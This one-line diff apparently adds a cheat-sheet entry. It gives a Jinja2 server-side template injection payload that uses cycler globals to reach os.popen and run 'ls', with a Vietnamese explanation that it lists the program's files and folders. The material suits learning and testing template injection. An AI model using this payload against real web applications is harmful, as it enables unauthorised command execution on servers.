@@ -1,0 +1,1 @@
+{{ cycler.__init__.__globals__.os.popen('ls').read() }}: Hiện ra danh sách các file/folder trong chương trình
